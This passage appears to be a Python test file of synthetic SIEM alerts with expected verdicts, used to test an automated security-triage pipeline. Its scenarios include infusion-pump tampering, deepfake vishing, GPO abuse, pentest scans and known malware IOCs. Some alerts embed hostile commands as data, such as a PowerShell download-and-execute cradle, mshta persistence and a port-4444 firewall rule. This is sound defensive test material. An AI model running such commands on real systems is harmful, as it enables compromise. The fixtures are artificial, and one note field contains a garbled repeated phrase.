    {"sequence": 5, "timestamp": "2026-06-01T09:22:15Z", "type": "AWS_API_CALL",
     "detail": "Stolen AWS_DEPLOY_KEY: sts:GetCallerIdentity, s3:ListBuckets, lambda:ListFunctions, secretsmanager:ListSecrets",
     "source_ip": "185.220.101.34", "note": "Enumerating production AWS infra"}
  ]
}
""")

_TH = _j(r"""
{
  "source": "Claroty xDome", "event_type": "MedicalDeviceAnomaly",
  "timestamp": "2026-06-01T03:45:22Z", "severity": "Critical", "confidence": 78,
  "device": {"name": "INF-PUMP-ICU-07", "type": "Baxter Sigma Spectrum Infusion Pump",
             "firmware_version": "8.0.0", "ip": "172.16.200.107", "mac": "00:1A:2B:3C:4D:07",
             "network_zone": "Medical-ICU-VLAN", "fda_regulated": true, "patient_connected": true,
             "location": "ICU Bay 7", "last_maintenance": "2026-05-01",
             "known_vulnerabilities": ["CVE-2022-26390 (CVSS 5.5)", "CVE-2022-26392 (CVSS 5.0)"]},
  "anomaly": {"type": "UNAUTHORIZED_COMMUNICATION", "events": [
    {"timestamp": "2026-06-01T03:45:22Z", "type": "OUTBOUND_DNS",
     "detail": "Pump queried DNS for 'update.baxter-medical.net' — NOT Baxter's infra. Official: 'updates.baxter.com'.",
     "resolved_ip": "185.234.72.99"},
    {"timestamp": "2026-06-01T03:45:30Z", "type": "HTTPS_CONNECTION",
     "detail": "HTTPS to 185.234.72.99:443. Cert CN: 'update.baxter-medical.net'. Issuer: Let's Encrypt (Baxter uses DigiCert).",
     "bytes_sent": 4891, "bytes_received": 287344},
    {"timestamp": "2026-06-01T03:46:15Z", "type": "FIRMWARE_WRITE_ATTEMPT",
     "detail": "Write detected on firmware partition. Source: 185.234.72.99. Size: 287KB.",
     "write_blocked": false, "note": "Firmware update mechanism does NOT validate signatures (CVE-2022-26390)"},
    {"timestamp": "2026-06-01T03:47:00Z", "type": "CONFIGURATION_CHANGE",
     "detail": "Drug library modified. Fentanyl limit 200→2000 mcg/hr. Propofol limit 200→2000 mcg/kg/min.",
     "previous_limits": {"Fentanyl": "200 mcg/hr", "Propofol": "200 mcg/kg/min"},
     "new_limits": {"Fentanyl": "2000 mcg/hr", "Propofol": "2000 mcg/kg/min"},
     "note": "Drug safety limits 10x increased — fatal overdose possible. Highest-stakes finding."}
  ]},
  "patient_context": {"patient_connected": true,
                      "current_infusion": "Normal Saline 125 mL/hr",
                      "scheduled_medications": ["Fentanyl 50 mcg/hr (06:00)", "Propofol PRN"],
                      "note": "Patient receiving saline; Fentanyl scheduled in 2h. Unremediated pump → 10x overdose risk."}
}
""")

_TI = _j(r"""
{
  "source": "Pindrop Voice Security + Cisco Webex", "event_type": "VoicePhishingDetected",
  "timestamp": "2026-06-01T15:45:00Z", "severity": "High", "confidence": 75,
  "call_details": {"caller_id": "+1-212-555-0100", "caller_id_spoofed": true,
                   "real_source": "VoIP trunk via Twilio, registered to 'Meridian Advisory LLC', 3 days ago",
                   "called_number": "+1-415-555-0200 (CORPB Finance Dept)", "duration_seconds": 847,
                   "recording_available": true, "recording_path": "/recordings/2026-06-01/call_847291.wav"},
  "voice_analysis": {"deepfake_probability": 94,
                     "voice_match": {"claimed_identity": "James Morrison (CEO)", "voice_profile_match": 89,
                                     "note": "Close match to CEO voice profile from earnings calls. AI synthesis artifacts: unnatural formant transitions at 2.3kHz, missing micromodulations 50-200Hz, suspiciously consistent pitch variance."},
                     "speech_patterns": {"urgency_indicators": 12, "authority_claims": 8, "secrecy_requests": 5,
                                         "social_engineering_score": 92,
                                         "key_phrases": ["I need this handled personally",
                                                         "Don't loop anyone else in — this is board-level confidential",
                                                         "I'm traveling and can't access my email",
                                                         "Process the wire today — the deal closes at midnight",
                                                         "I'll send you the details from my personal email"]}},
  "call_content_summary": "Caller impersonating CEO James Morrison requested urgent wire $892,000 to 'Meridian Advisory LLC'. Confirmation to personal email jmorrison.exec@gmail.com. Caller had detailed knowledge of acquisition discussions and named board members.",
  "correlation": {"related_email": "BEC email from james.morrison@acmecorp.co 1.5h earlier (TEST F) targeting same wire",
                  "note": "Multi-channel attack: BEC email + deepfake voice. Voice references the email."}
}
""")

_TJ = _j(r"""
{
  "source": "Microsoft Defender for Identity", "event_type": "GroupPolicyAbuse",
  "timestamp": "2026-06-01T01:15:00Z", "severity": "Critical", "confidence": 87,
  "alert": {"name": "Malicious Group Policy Object Modification",
            "description": "Unauthorized GPO created and linked to domain root — deploys scheduled task to all domain-joined computers"},
  "actor": {"username": "CORPB\\svc-sccm", "display_name": "SCCM Service Account",
            "source_ip": "10.10.22.94", "source_hostname": "DEV-WS-0194",
            "note": "svc-sccm should only modify GPOs from SCCM server (10.10.3.50), not dev workstation. Compromised."},
  "gpo_details": {"gpo_name": "Windows Update Configuration - Security Baseline v4.2",
                  "gpo_guid": "{6AC1786C-016F-11D2-945F-00C04FB984F9}",
                  "created": "2026-06-01T01:15:00Z", "linked_to": "DC=acmecorp,DC=local",
                  "link_enforced": true,
                  "note": "Linked to domain root with enforcement → applies to ALL 312 domain-joined computers"},
  "gpo_contents": {
    "scheduled_task": {"name": "WindowsUpdateHealthCheck", "trigger": "AtLogon + Daily 02:00",
                       "action": "powershell.exe -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.22.94:8080/health')\"",
                       "run_as": "SYSTEM",
                       "note": "Runs as SYSTEM every logon + daily 2am. Downloads PowerShell from compromised dev box."},
    "registry_modification": {"key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                              "value_name": "SecurityHealthService",
                              "value_data": "C:\\Windows\\System32\\mshta.exe http://10.10.22.94:8080/update.hta",
                              "note": "Persistence via Run key with mshta.exe (LOLBin)"},
    "firewall_rule": {"name": "Windows Update Service (Inbound)", "direction": "Inbound",
                      "port": "4444", "action": "Allow",
                      "note": "Opens port 4444 — Metasploit/reverse shell default"}
  },
  "impact": {"affected_computers": 312, "execution_window": "Next logon or 02:00 UTC",
             "time_to_impact": "~45 minutes (next logon cycle)",
             "note": "Domain-wide within one logon cycle: scheduled task as SYSTEM + Run key + port 4444 inbound on all 312 computers."}
}
""")


# ── v3 DEMO payloads — synthetic-IOC fixtures ────────────────────
#
# Eight scenarios where every IOC uses a deliberately synthetic pattern
# that public TI sources have no record of:
#
#   • RFC 5737 TEST-NET IPs:   198.51.100.x / 192.0.2.x / 203.0.113.x
#   • NetBIOS-shape names:     CORPA / CORPB / *.example.local
#   • 48-char placeholder hashes (NOT valid SHA-256/SHA-1/MD5)
#   • Fictional domains:       update-check-cdn.net, etc.
#
# Purpose: a deterministic test fixture for downstream enrichment-
# bypass / synthetic-IOC-detector work. A consumer running these
# scenarios should NOT round-trip to public TI APIs — pattern-match on
# the synthetic-IOC shape and short-circuit.
#
# Categories covered span the typical SIEM incident taxonomy:
#   107 Malware · 108 Phishing · 110 Network Anomaly · 111 Cloud
#   Security · 114 Cloud Security · 123 (Phishing escalation)

_DEMO_A = _j(r"""
{
  "source": "QRadar", "event_type": "MalwareDetection",
  "timestamp": "2026-06-09T08:14:22Z", "severity": "Medium", "confidence": 50,
  "category": "107 Malware",
  "alert": {"name": "Suspected PUP / admin-tool execution",
            "description": "Sysmon flagged admin-tool launch on managed-services workstation. 4 IOCs observed; verdict pending enrichment."},
  "host": {"hostname": "WIN-DESKTOP-01.example.local", "domain": "CORPA",
           "ip": "198.51.100.77",
           "note": "RFC 5737 TEST-NET-2 IP — reserved for documentation; not internet-routable."},
  "process": {"name": "psexec.exe", "user": "CORPA\\admin.svc",
              "sha256": "d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
              "note": "48-char placeholder hash — NOT a valid SHA-256 (would be 64 chars). Synthetic fixture only."},
  "iocs": [
    {"type": "ip", "value": "198.51.100.77", "pattern": "rfc5737_testnet"},
    {"type": "domain", "value": "update-check-cdn.net", "pattern": "fictional"},
    {"type": "hash_synthetic", "value": "d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2", "pattern": "placeholder_48char"},
    {"type": "user", "value": "CORPA\\admin.svc", "pattern": "netbios_internal"}
  ],
  "expected_verdict": "BENIGN_AUTHORIZED",
  "note": "Admin tools on managed-services workstations are sanctioned. Roll-up to BENIGN_AUTHORIZED if all IOCs synthetic-pattern + actor in admin role."
}
""")

_DEMO_B = _j(r"""
{
  "source": "QRadar", "event_type": "PhishingEmail",
  "timestamp": "2026-06-09T09:42:11Z", "severity": "Medium", "confidence": 55,
  "category": "108 Phishing → escalates to 123",
  "alert": {"name": "Phishing email — credential-harvest link",
            "description": "Inbound email with credential-harvest link reported by recipient. Sender IP synthetic."},
  "message": {"from": "billing-update@acme-portal-secure.net",
              "to": ["finance.team@example.local"],
              "subject": "Action Required: Invoice #ACM-2026-4419",
              "sender_ip": "192.0.2.45",
              "url": "https://acme-portal-secure.net/login?id=4419"},
  "iocs": [
    {"type": "ip", "value": "192.0.2.45", "pattern": "rfc5737_testnet"},
    {"type": "domain", "value": "acme-portal-secure.net", "pattern": "fictional"}
  ],
  "expected_verdict": "VERIFICATION_REQUIRED",
  "note": "Phishing pattern is real-shape, but IOCs are synthetic. Escalation 108→123 if user clicks (treat as credential-compromise)."
}
""")

_DEMO_C = _j(r"""
{
  "source": "QRadar", "event_type": "NetworkAnomaly",
  "timestamp": "2026-06-09T10:18:33Z", "severity": "High", "confidence": 60,
  "category": "110 Network Anomaly → escalates to 114 Cloud Security",
  "alert": {"name": "Unexpected outbound to non-corporate destination",
            "description": "Outbound TCP 443 to undocumented external host from finance subnet. 2 IOCs."},
  "flow": {"source_ip": "10.42.83.12", "source_host": "FIN-LAPTOP-22.example.local",
           "destination_ip": "203.0.113.222", "destination_port": 443,
           "destination_domain": "update-check-cdn.net",
           "bytes_sent": 84312, "bytes_received": 12408,
           "duration_seconds": 47},
  "iocs": [
    {"type": "ip", "value": "203.0.113.222", "pattern": "rfc5737_testnet"},
    {"type": "domain", "value": "update-check-cdn.net", "pattern": "fictional"}
  ],
  "expected_verdict": "SUSPICIOUS",
  "note": "Cloud-egress shape is real, IOCs synthetic. Escalation 110→114 if pattern repeats over multiple hosts."
}
""")

_DEMO_D = _j(r"""
{
  "source": "QRadar", "event_type": "MalwareDetection",
  "timestamp": "2026-06-09T11:03:55Z", "severity": "High", "confidence": 65,
  "category": "107 Malware",
  "alert": {"name": "Suspicious binary on HR workstation",
            "description": "Unsigned binary executed under HR intern session. 2 IOCs."},
  "host": {"hostname": "HR-WORKSTATION-09.example.local", "domain": "CORPA",
           "ip": "10.20.40.55"},
  "process": {"name": "invoice_viewer.exe", "user": "CORPA\\hr.intern",
              "sha256": "f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4",
              "note": "48-char placeholder hash"},
  "iocs": [
    {"type": "hash_synthetic", "value": "f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4", "pattern": "placeholder_48char"},
    {"type": "user", "value": "CORPA\\hr.intern", "pattern": "netbios_internal"}
  ],
  "expected_verdict": "VERIFICATION_REQUIRED"
}
""")

_DEMO_E = _j(r"""
{
  "source": "QRadar", "event_type": "CloudControlPlaneActivity",
  "timestamp": "2026-06-09T12:21:08Z", "severity": "High", "confidence": 70,
  "category": "114 Cloud Security → escalates to 111",
  "alert": {"name": "IAM policy modification from unmanaged IP",
            "description": "AWS IAM AttachUserPolicy event from an IP outside the documented admin range."},
  "cloud_event": {"provider": "AWS", "service": "iam",
                  "action": "AttachUserPolicy",
                  "actor_arn": "arn:aws:iam::123456789012:user/devops.bot",
                  "source_ip": "192.0.2.198",
                  "user_agent": "aws-cli/2.13.4 Python/3.11.4",
                  "policy_attached": "AdministratorAccess",
                  "target_user": "arn:aws:iam::123456789012:user/temp.contractor"},
  "iocs": [
    {"type": "ip", "value": "192.0.2.198", "pattern": "rfc5737_testnet"}
  ],
  "expected_verdict": "SUSPICIOUS",
  "note": "Privilege-escalation shape is real (AttachUserPolicy → AdministratorAccess → contractor account), source IP synthetic. 114→111 if target user becomes active."
}
""")

_DEMO_F = _j(r"""
{
  "source": "QRadar", "event_type": "MalwareDetection",
  "timestamp": "2026-06-09T13:47:19Z", "severity": "Medium", "confidence": 45,
  "category": "107 Malware",
  "alert": {"name": "Quarantined binary — synthetic hash",
            "description": "EDR quarantined a binary based on heuristic; hash has no reputation."},
  "host": {"hostname": "DEV-BUILD-03.example.local", "ip": "10.30.55.77"},
  "process": {"name": "build_helper.exe",
              "sha256": "a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2",
              "note": "48-char placeholder hash"},
  "iocs": [
    {"type": "hash_synthetic", "value": "a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2", "pattern": "placeholder_48char"}
  ],
  "expected_verdict": "VERIFICATION_REQUIRED"
}
""")

_DEMO_G = _j(r"""
{
  "source": "QRadar", "event_type": "MalwareDetection",
  "timestamp": "2026-06-09T14:12:44Z", "severity": "Medium", "confidence": 50,
  "category": "107 Malware",
  "alert": {"name": "Service account ran ad-hoc PowerShell",
            "description": "Service account CORPB\\service.acc invoked PowerShell outside its scheduled-task window."},
  "host": {"hostname": "DC-PRIMARY.example.local", "domain": "CORPB"},
  "process": {"name": "powershell.exe", "user": "CORPB\\service.acc",
              "command_line": "powershell.exe -ep bypass -nop -c Get-ADUser -Filter *"},
  "iocs": [
    {"type": "user", "value": "CORPB\\service.acc", "pattern": "netbios_internal"}
  ],
  "expected_verdict": "SUSPICIOUS",
  "note": "Behaviour signal is real (service acct doing AD recon), actor identifier is NetBIOS-internal so no external TI hit."
}
""")

_DEMO_H = _j(r"""
{
  "source": "QRadar", "event_type": "PhishingEmail",
  "timestamp": "2026-06-09T15:30:01Z", "severity": "Medium", "confidence": 55,
  "category": "108 Phishing",
  "alert": {"name": "Phishing — sender IP is Tor exit node",
            "description": "Phishing email arrived from a Tor exit node. Only IOC is the Tor IP (the only TI hit in this corpus)."},
  "message": {"from": "noreply@acme-corp-billing.example",
              "to": ["accounts.payable@example.local"],
              "subject": "Final notice — payment overdue",
              "sender_ip": "185.220.101.34",
              "note": "185.220.101.x is a real Tor-exit /24. The only TI source that reliably attributes this range is TorProject."},
  "iocs": [
    {"type": "ip", "value": "185.220.101.34", "pattern": "tor_exit_node",
     "note": "Real Tor exit IP — only IOC in the demo corpus that public TI consistently identifies. See the cross-attribution issue this IOC triggers for the cross-attribution issue this IOC triggers."}
  ],
  "expected_verdict": "SUSPICIOUS"
}
""")


# ── v4 SCAN payloads (2026-06-09) — authorized-pentest recon chain ──
#
# Three sibling alerts from the same actor (SECTEAM\\pentester-01) and same
# source IP (10.50.5.42) targeting three different production hosts
# over ~20 minutes. Designed to:
#
#   • Drive Entity Agent (actor-attribution flow) — every alert
#     carries actor.username = SECTEAM\\pentester-01 + iocs[].type = "user"
#   • Give related_incidents a same_source_ip + same_user clustering
#     anchor so the disposition recommender can roll all three into
#     a single "authorized pentest" verdict
#   • Each independently looks like genuine recon (SEV3, borderline
#     s3_score 50-60, VERIFICATION_REQUIRED expected verdict) so
#     the auto-close decision matters
#
# qradar_categories override on each → ingestion sees "Port Scan" /
# "Network Reconnaissance" / "Suspicious Network Activity" instead of
# the generic "Sophisticated-Test" label.

_SCAN_A = _j(r"""
{
  "source": "QRadar",
  "event_type": "NetworkReconnaissance",
  "timestamp": "2026-06-09T14:02:18Z",
  "severity": "Medium",
  "confidence": 55,
  "category": "110 Network Anomaly",
  "qradar_categories": ["Port Scan", "Network Reconnaissance"],
  "alert": {
    "name": "Network reconnaissance from internal host",
    "description": "Sustained TCP SYN scan from internal host targeting database tier ports (22, 80, 443, 1433, 3389) on WIN-PROD-DB-01. 12 src→dst flows in 90s."
  },
  "actor": {
    "username": "SECTEAM\\pentester-01",
    "display_name": "Hashir (VAPT Karachi)",
    "source_ip": "10.50.5.42",
    "source_hostname": "VAPT-KHI-WS-04",
    "note": "Account part of the authorized internal pentest team. No formal change window logged for this date — Entity Agent should resolve."
  },
  "process": {
    "name": "nmap.exe",
    "command_line": "nmap.exe -sS -T4 -p 22,80,443,1433,3389 10.10.20.30",
    "parent": "powershell.exe"
  },
  "target": {
    "hostname": "WIN-PROD-DB-01",
    "ip": "10.10.20.30",
    "role": "Production SQL Server",
    "criticality": "high"
  },
  "scan_details": {
    "scan_type": "TCP SYN",
    "ports_scanned": [22, 80, 443, 1433, 3389],
    "open_ports_observed": [1433, 3389],
    "duration_seconds": 90,
    "flow_count": 12
  },
  "iocs": [
    {"type": "source_ip", "value": "10.50.5.42", "pattern": "internal_corp_source"},
    {"type": "destination_ip", "value": "10.10.20.30", "pattern": "internal_corp_dest"},
    {"type": "user", "value": "SECTEAM\\pentester-01", "pattern": "authorized_pentest_actor"},
    {"type": "process", "value": "nmap.exe", "pattern": "recon_tool"}
  ],
  "compromised_asset": "WIN-PROD-DB-01",
  "related_incidents_anchors": ["same_source_ip:10.50.5.42", "same_user:SECTEAM\\pentester-01"],
  "expected_verdict": "VERIFICATION_REQUIRED",
  "expected_disposition": "true_positive_benign_authorized",
  "expected_s3_score_range": [50, 60],
  "expected_severity": "SEV3",
  "note": "Alert 1 of 3 — recon chain from VAPT KHI internal pentest team. Without context: looks like internal recon. With Entity Agent + related_incidents context: authorized VAPT activity, auto-close to true_positive_benign_authorized recommended."
}
""")

_SCAN_B = _j(r"""
{
  "source": "QRadar",
  "event_type": "NetworkReconnaissance",
  "timestamp": "2026-06-09T14:11:44Z",
  "severity": "Medium",
  "confidence": 58,
  "category": "110 Network Anomaly",
  "qradar_categories": ["Network Reconnaissance", "Suspicious Network Activity"],
  "alert": {
    "name": "Network reconnaissance from internal host",
    "description": "Service-version enumeration (nmap -sV) from same internal source observed in incident 9 minutes earlier. New target: WIN-PROD-APP-01. Targets app-server ports (80, 443, 8080, 8443, 5985)."
  },
  "actor": {
    "username": "SECTEAM\\pentester-01",
    "display_name": "Hashir (VAPT Karachi)",
    "source_ip": "10.50.5.42",
    "source_hostname": "VAPT-KHI-WS-04",
    "note": "Same actor + source as alert 1 (SCAN-A). related_incidents should cluster these on same_source_ip + same_user."
  },
  "process": {
    "name": "nmap.exe",
    "command_line": "nmap.exe -sV -T4 -p 80,443,8080,8443,5985 10.10.20.31",
    "parent": "powershell.exe"
  },
  "target": {
    "hostname": "WIN-PROD-APP-01",
    "ip": "10.10.20.31",
    "role": "Production application server (.NET / IIS)",
    "criticality": "high"
  },
  "scan_details": {
    "scan_type": "Service version detection (-sV)",
    "ports_scanned": [80, 443, 8080, 8443, 5985],
    "services_identified": [
      {"port": 80, "service": "Microsoft IIS 10.0"},
      {"port": 443, "service": "Microsoft IIS 10.0 (TLS 1.2)"},
      {"port": 5985, "service": "WinRM HTTP"}
    ],
    "duration_seconds": 124,
    "flow_count": 18
  },
  "iocs": [
    {"type": "source_ip", "value": "10.50.5.42", "pattern": "internal_corp_source"},
    {"type": "destination_ip", "value": "10.10.20.31", "pattern": "internal_corp_dest"},
    {"type": "user", "value": "SECTEAM\\pentester-01", "pattern": "authorized_pentest_actor"},
    {"type": "process", "value": "nmap.exe", "pattern": "recon_tool"}
  ],
  "compromised_asset": "WIN-PROD-APP-01",
  "related_incidents_anchors": ["same_source_ip:10.50.5.42", "same_user:SECTEAM\\pentester-01"],
  "expected_verdict": "VERIFICATION_REQUIRED",
  "expected_disposition": "true_positive_benign_authorized",
  "expected_s3_score_range": [50, 60],
  "expected_severity": "SEV3",
  "note": "Alert 2 of 3 — same actor, same source IP, different target. By this point related_incidents should be returning SCAN-A as a same_source_ip match; Entity Agent should cache the actor profile."
}
""")

_SCAN_C = _j(r"""
{
  "source": "QRadar",
  "event_type": "NetworkReconnaissance",
  "timestamp": "2026-06-09T14:22:07Z",
  "severity": "Medium",
  "confidence": 60,
  "category": "110 Network Anomaly",
  "qradar_categories": ["Network Reconnaissance", "Port Scan"],
  "alert": {
    "name": "Network reconnaissance from internal host",
    "description": "Vulnerability-script scan (nmap --script vuln) from same internal source observed in incidents 20 + 10 minutes earlier. New target: WIN-PROD-WEB-01. Active probing of known web-server CVEs."
  },
  "actor": {
    "username": "SECTEAM\\pentester-01",
    "display_name": "Hashir (VAPT Karachi)",
    "source_ip": "10.50.5.42",
    "source_hostname": "VAPT-KHI-WS-04",
    "note": "Same actor + source as alerts 1 (SCAN-A) and 2 (SCAN-B). related_incidents should now have 2 prior matches with same_source_ip + same_user — strong signal for authorized-pentest verdict."
  },
  "process": {
    "name": "nmap.exe",
    "command_line": "nmap.exe --script vuln -p 80,443 10.10.20.32",
    "parent": "powershell.exe"
  },
  "target": {
    "hostname": "WIN-PROD-WEB-01",
    "ip": "10.10.20.32",
    "role": "Production public-facing web server",
    "criticality": "critical"
  },
  "scan_details": {
    "scan_type": "Vulnerability scripts (--script vuln)",
    "ports_scanned": [80, 443],
    "scripts_run": ["http-vuln-cve2017-5638", "http-shellshock", "ssl-heartbleed", "http-vuln-cve2017-1001000"],
    "vulnerabilities_flagged": 0,
    "duration_seconds": 412,
    "flow_count": 47
  },
  "iocs": [
    {"type": "source_ip", "value": "10.50.5.42", "pattern": "internal_corp_source"},
    {"type": "destination_ip", "value": "10.10.20.32", "pattern": "internal_corp_dest"},
    {"type": "user", "value": "SECTEAM\\pentester-01", "pattern": "authorized_pentest_actor"},
    {"type": "process", "value": "nmap.exe", "pattern": "recon_tool"}
  ],
  "compromised_asset": "WIN-PROD-WEB-01",
  "related_incidents_anchors": ["same_source_ip:10.50.5.42", "same_user:SECTEAM\\pentester-01"],
  "expected_verdict": "VERIFICATION_REQUIRED",
  "expected_disposition": "true_positive_benign_authorized",
  "expected_s3_score_range": [55, 65],
  "expected_severity": "SEV3",
  "note": "Alert 3 of 3 — final recon step is more aggressive (vuln scripts vs SYN/version scan). Severity inches up but disposition recommender should still close as authorized given the 2 prior related incidents with the same source+actor."
}
""")


# ── v5 ENRICH payloads (2026-06-09) — real public-TI-confirmed IOCs ──
#
# The positive-path complement to the DEMO batch (which uses synthetic
# IOCs and tests the enrichment-BYPASS detector). These 5 scenarios
# carry IOCs that public threat-intel sources reliably tag:
#
#   • AlienVault OTX
#   • abuse.ch ThreatFox / URLhaus / MalwareBazaar
#   • VirusTotal
#   • GreyNoise (scanner attribution + Tor exit tagging)
#   • PhishTank / OpenPhish
#
# Every IOC carries `pattern: "ti_*"` so downstream consumers can tell
# this from synthetic-pattern IOCs without parsing the value. Designed
# for testing the full enrichment chain — agent should round-trip to
# public TI, receive positive attribution, and the chain should resolve
# to MALICIOUS with high confidence.

_ENRICH_A = _j(r"""
{
  "source": "CrowdStrike Falcon",
  "event_type": "RansomwareDetection",
  "timestamp": "2026-06-09T16:08:42Z",
  "severity": "Critical",
  "confidence": 95,
  "category": "107 Malware (Ransomware)",
  "qradar_categories": ["Ransomware", "Malware Outbreak"],
  "alert": {
    "name": "Known WannaCry ransomware sample executed",
    "description": "EDR detonated SMB-spreading executable matching WannaCry v2 signature. SHA-256 confirmed against MalwareBazaar + 64/72 VT detections at last query. Kill-switch domain present in binary — host attempted DNS lookup but firewall blocked egress."
  },
  "host": {"hostname": "FIN-LAPTOP-22.example.local", "ip": "10.20.40.55", "user": "EXAMPLE\\analyst"},
  "process": {
    "name": "tasksche.exe",
    "command_line": "tasksche.exe",
    "parent": "@WanaDecryptor@.exe",
    "sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
  },
  "network": {
    "killswitch_domain": "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",
    "killswitch_lookup_blocked": true,
    "smb_scan_targets": ["10.20.40.0/24", "10.20.41.0/24"],
    "note": "Without killswitch lookup, WannaCry proceeds to encrypt. Firewall block was the only thing stopping spread on this host."
  },
  "iocs": [
    {"type": "hash_sha256", "value": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
     "pattern": "ti_known_wannacry",
     "note": "Real WannaCry sample hash, documented by Microsoft + US-CERT + VT 64+/72. AlienVault OTX pulse: WannaCry."},
    {"type": "domain", "value": "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",
     "pattern": "ti_known_wannacry_killswitch",
     "note": "WannaCry kill-switch domain. Sinkholed by MalwareTech 2017-05-12. ThreatFox + AlienVault tagged."}
  ],
  "compromised_asset": "FIN-LAPTOP-22.example.local",
  "expected_verdict": "MALICIOUS_CONFIRMED",
  "expected_disposition": "true_positive_confirmed",
  "expected_ti_sources": ["VirusTotal", "AlienVault OTX", "ThreatFox", "MalwareBazaar"],
  "expected_severity": "SEV1",
  "note": "Positive-path test: enrichment agent should round-trip to public TI, receive >5 source confirmations, return MALICIOUS_CONFIRMED with confidence ~0.95. Contrast with DEMO-A (BENIGN_AUTHORIZED) — both are 107 Malware but the IOC patterns drive opposite verdicts."
}
""")

_ENRICH_B = _j(r"""
{
  "source": "QRadar",
  "event_type": "C2Callback",
  "timestamp": "2026-06-09T16:34:11Z",
  "severity": "Critical",
  "confidence": 90,
  "category": "109 Command and Control",
  "qradar_categories": ["Command and Control", "Suspicious Network Activity"],
  "alert": {
    "name": "Historical Stuxnet C2 callback observed",
    "description": "Outbound DNS resolution to known Stuxnet C2 domain from internal SCADA-adjacent host. The domains were the original Stuxnet hard-coded C2 — sinkholed since 2010 but still in every TI database. Either reinfection from old media OR researcher testing."
  },
  "host": {"hostname": "ENG-OT-WS-07.example.local", "ip": "10.30.91.205",
           "role": "Engineering OT-adjacent workstation"},
  "network": {
    "outbound_dns_lookups": [
      {"domain": "mypremierfutbol.com", "timestamp": "2026-06-09T16:34:11Z", "resolved_to": "94.102.49.193"},
      {"domain": "todaysfutbol.com", "timestamp": "2026-06-09T16:34:15Z", "resolved_to": "94.102.49.193"}
    ],
    "connection_attempt": "TCP 443 → 94.102.49.193 (sinkhole)",
    "result": "Blocked at proxy — no payload delivered"
  },
  "iocs": [
    {"type": "domain", "value": "mypremierfutbol.com",
     "pattern": "ti_known_stuxnet",
     "note": "Original Stuxnet C2 domain. Sinkholed by Symantec ~2010, in every TI feed since. AlienVault, ThreatFox, MISP, OTX."},
    {"type": "domain", "value": "todaysfutbol.com",
     "pattern": "ti_known_stuxnet",
     "note": "Second Stuxnet hard-coded C2. Same provenance as mypremierfutbol.com — sinkholed, universally TI-tagged."}
  ],
  "compromised_asset": "ENG-OT-WS-07.example.local",
  "expected_verdict": "MALICIOUS_CONFIRMED",
  "expected_disposition": "true_positive_confirmed_historical",
  "expected_ti_sources": ["AlienVault OTX", "ThreatFox", "MISP", "Cisco Umbrella"],
  "expected_severity": "SEV1",
  "note": "Positive-path test with historical-but-TI-attributed IOCs. Useful because the sinkhole means no real payload risk — but a real consumer chain should still escalate aggressively because Stuxnet IOC sighting on an OT-adjacent host is high-signal regardless of sinkhole status."
}
""")

_ENRICH_C = _j(r"""
{
  "source": "Microsoft Defender for Endpoint",
  "event_type": "MalwareDetection",
  "timestamp": "2026-06-09T17:00:00Z",
  "severity": "Informational",
  "confidence": 100,
  "category": "107 Malware (Test signature)",
  "qradar_categories": ["Malware", "Test Detection"],
  "alert": {
    "name": "EICAR test file written to disk",
    "description": "EICAR antivirus test file detected on disk. This is the universally-recognized AV testing signature — every TI source identifies it as the EICAR test pattern. Positive-control case: confirms the enrichment pipeline can return 100% confidence MALICIOUS verdict from a fully-attributable IOC."
  },
  "host": {"hostname": "DEV-BUILD-03.example.local", "ip": "10.30.55.77",
           "user": "EXAMPLE\\security.tester"},
  "process": {
    "name": "notepad.exe",
    "command_line": "notepad.exe C:\\Users\\Public\\eicar.com",
    "parent": "explorer.exe"
  },
  "file": {
    "path": "C:\\Users\\Public\\eicar.com",
    "size_bytes": 68,
    "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
    "md5": "44d88612fea8a8f36de82e1278abb02f"
  },
  "iocs": [
    {"type": "hash_sha256", "value": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
     "pattern": "ti_eicar_test",
     "note": "EICAR antivirus test file SHA-256. Universal — every AV + TI source identifies as the EICAR test signature."},
    {"type": "hash_md5", "value": "44d88612fea8a8f36de82e1278abb02f",
     "pattern": "ti_eicar_test",
     "note": "EICAR antivirus test file MD5 — same provenance as the SHA-256 above."}
  ],
  "compromised_asset": "DEV-BUILD-03.example.local",
  "expected_verdict": "MALICIOUS_CONFIRMED",
  "expected_disposition": "true_positive_benign_test",
  "expected_ti_sources": ["VirusTotal", "AlienVault OTX", "MalwareBazaar", "Microsoft", "ClamAV"],
  "expected_severity": "SEV4",
  "note": "Positive-control test. EICAR is intentionally benign — disposition is true_positive_benign_test (a real detection of a real test signature), not true_positive_confirmed. Severity stays low because every consumer should recognize EICAR. If a chain ever escalates this to SEV1+, the chain is broken."
}
""")

_ENRICH_D = _j(r"""
{
  "source": "Zscaler ZIA",
  "event_type": "AnonymizationEgress",
  "timestamp": "2026-06-09T17:21:55Z",
  "severity": "High",
  "confidence": 80,
  "category": "117 Recon (Anonymization)",
  "qradar_categories": ["Tor Egress", "Anonymization Network"],
  "alert": {
    "name": "Outbound traffic to confirmed Tor exit node",
    "description": "User workstation initiated direct TCP 443 connection to an IP in the Tor exit node /24. Multiple TI sources (TorProject directory, GreyNoise, AbuseIPDB) confirm the destination as an active Tor exit. No business justification on file."
  },
  "host": {"hostname": "MKT-LAPTOP-14.example.local", "ip": "10.40.15.88",
           "user": "EXAMPLE\\marketing.lead"},
  "network": {
    "source_ip": "10.40.15.88",
    "destination_ip": "185.220.101.45",
    "destination_port": 443,
    "destination_country": "DE (TorProject exit)",
    "bytes_transferred": 14823,
